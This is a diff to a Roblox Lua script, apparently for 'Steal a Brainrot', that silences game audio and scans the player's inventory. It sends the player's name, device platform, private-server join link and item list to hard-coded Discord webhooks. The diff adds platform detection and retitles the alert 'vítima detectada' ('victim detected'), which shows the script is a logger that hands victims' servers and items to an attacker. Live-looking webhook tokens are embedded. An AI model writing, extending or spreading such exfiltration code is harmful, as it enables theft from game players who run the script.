@@ -9,10 +9,11 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService") -- ADICIONADO: para detectar plataforma
 
 local WEBHOOKS = {
     "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB", -- WEBHOOK 1
-    "https://discord.com/api/webhooks/1445225244066447412/ADMSYh0LULeqwd_XTjkDNDn5g0NQynu326WSz7blOFjlfG6jB_gMT9GRLqfHcLHey8GT",  --WEBHOOK 2
+    "",  --WEBHOOK 2
 }
 
 --========================================================--
@@ -36,18 +37,18 @@ local function StopAllSounds()
         end)
     end
 
-    -- Aplica em todos os lugares que possam ter sons
-    StopDescendants(Workspace)
-    StopDescendants(ReplicatedStorage)
-    StopDescendants(StarterGui)
-    StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))
-    StopDescendants(LocalPlayer:WaitForChild("Backpack"))
-    if LocalPlayer.Character then
-        StopDescendants(LocalPlayer.Character)
-    end
+    -- Aplica em todos os lugares que possam ter sons  
+    StopDescendants(Workspace)  
+    StopDescendants(ReplicatedStorage)  
+    StopDescendants(StarterGui)  
+    StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))  
+    StopDescendants(LocalPlayer:WaitForChild("Backpack"))  
+    if LocalPlayer.Character then  
+        StopDescendants(LocalPlayer.Character)  
+    end  
 
-    LocalPlayer.CharacterAdded:Connect(function(char)
-        StopDescendants(char)
+    LocalPlayer.CharacterAdded:Connect(function(char)  
+        StopDescendants(char)  
     end)
 end
 
@@ -110,33 +111,47 @@ Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
 local serverLinkFinal = nil
 local startTime = os.time()
 
+-- ADICIONADO: função para detectar plataforma
+local function GetPlatform()
+    -- Prioriza touch -> mobile; keyboard -> PC; gamepad -> Console
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "Unknown"
+    end
+end
+
 local function SendWebhook(extraFields)
     local timeStr = "foi ás " .. os.date("%H:%M")
 
-    local payloadTable = {
-        username = "by: print()",
-        embeds = {{
-            title = "🔗 auto kz7| " .. timeStr,
-            color = 16732240,
-            fields = extraFields,
-            image = {
-                url = "https://cdn.discordapp.com/attachments/1445198590455582802/1445199774360928256/17646328133712.jpg?ex=692f7aac&is=692e292c&hm=05903daaddc4c2910e5c15ca7692472607168a0403879615a169dd25906ec255&"
-            }
-        }}
-    }
+    local payloadTable = {  
+        username = "by: print()",  
+        embeds = {{  
+            title = "vítima detectada 😈| " .. timeStr,  
+            color = 16732240,  
+            fields = extraFields,  
+            image = {  
+                url = "https://cdn.discordapp.com/attachments/1445198590455582802/1445199774360928256/17646328133712.jpg?ex=692f7aac&is=692e292c&hm=05903daaddc4c2910e5c15ca7692472607168a0403879615a169dd25906ec255"  
+            }  
+        }}  
+    }  
 
-    local payload = HttpService:JSONEncode(payloadTable)
+    local payload = HttpService:JSONEncode(payloadTable)  
 
-    -- Enviar para cada webhook da lista
-    for _, url in ipairs(WEBHOOKS) do
-        pcall(function()
-            HttpService:RequestAsync({
-                Url = url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = payload
-            })
-        end)
+    -- Enviar para cada webhook da lista  
+    for _, url in ipairs(WEBHOOKS) do  
+        pcall(function()  
+            HttpService:RequestAsync({  
+                Url = url,  
+                Method = "POST",  
+                Headers = {["Content-Type"] = "application/json"},  
+                Body = payload  
+            })  
+        end)  
     end
 end
 
@@ -232,54 +247,55 @@ local function ScanBrainrots()
     local animalsModule = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild("Animals")
     if not animalsModule then return end
 
-    local brainrotDB = {}
-    local success, animalData = pcall(require, animalsModule)
-    if success and type(animalData) == "table" then
-        for name,data in pairs(animalData) do
-            if type(data)=="table" and data.Price and data.Generation then
-                brainrotDB[name] = {income = data.Generation}
-            end
-        end
-    end
+    local brainrotDB = {}  
+    local success, animalData = pcall(require, animalsModule)  
+    if success and type(animalData) == "table" then  
+        for name,data in pairs(animalData) do  
+            if type(data)=="table" and data.Price and data.Generation then  
+                brainrotDB[name] = {income = data.Generation}  
+            end  
+        end  
+    end  
 
-    local brainrotCount = {}
+    local brainrotCount = {}  
 
-    for _, plot in pairs(Workspace.Plots:GetChildren()) do
-        for _, brainrot in pairs(plot:GetChildren()) do
-            if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then
-                local income = brainrotDB[brainrot.Name].income
-                local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")
-                if rootPart then
-                    if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end
-                    local highlight = Instance.new("Highlight")
-                    highlight.Name = "ESP"
-                    highlight.FillColor = Color3.fromRGB(0,100,255)
-                    highlight.OutlineColor = Color3.new(1,1,1)
-                    highlight.FillTransparency = 0.1
-                    highlight.OutlineTransparency = 0
-                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                    highlight.Parent = brainrot
-                end
-                if not brainrotCount[brainrot.Name] then
-                    brainrotCount[brainrot.Name] = {count=1, income=income}
-                else
-                    brainrotCount[brainrot.Name].count += 1
-                end
-            end
-        end
-    end
+    for _, plot in pairs(Workspace.Plots:GetChildren()) do  
+        for _, brainrot in pairs(plot:GetChildren()) do  
+            if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then  
+                local income = brainrotDB[brainrot.Name].income  
+                local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")  
+                if rootPart then  
+                    if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end  
+                    local highlight = Instance.new("Highlight")  
+                    highlight.Name = "ESP"  
+                    highlight.FillColor = Color3.fromRGB(0,100,255)  
+                    highlight.OutlineColor = Color3.new(1,1,1)  
+                    highlight.FillTransparency = 0.1  
+                    highlight.OutlineTransparency = 0  
+                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop  
+                    highlight.Parent = brainrot  
+                end  
+                if not brainrotCount[brainrot.Name] then  
+                    brainrotCount[brainrot.Name] = {count=1, income=income}  
+                else  
+                    brainrotCount[brainrot.Name].count += 1  
+                end  
+            end  
+        end  
+    end  
 
-    local extraFields = {}
-    local content = ""
-    for name, data in pairs(brainrotCount) do
-        content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"
-    end
-    extraFields = {
-        {name="Player", value=LocalPlayer.Name},
-        {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},
-        {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},
-        {name="Brainrots", value=content, inline=false}
-    }
+    local extraFields = {}  
+    local content = ""  
+    for name, data in pairs(brainrotCount) do  
+        content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"  
+    end  
+    extraFields = {  
+        {name="Player", value=LocalPlayer.Name},  
+        {name="Plataforma", value=GetPlatform(), inline=false}, -- ADICIONADO: plataforma
+        {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},  
+        {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},  
+        {name="Brainrots", value=content, inline=false}  
+    }  
     SendWebhook(extraFields)
 end
 
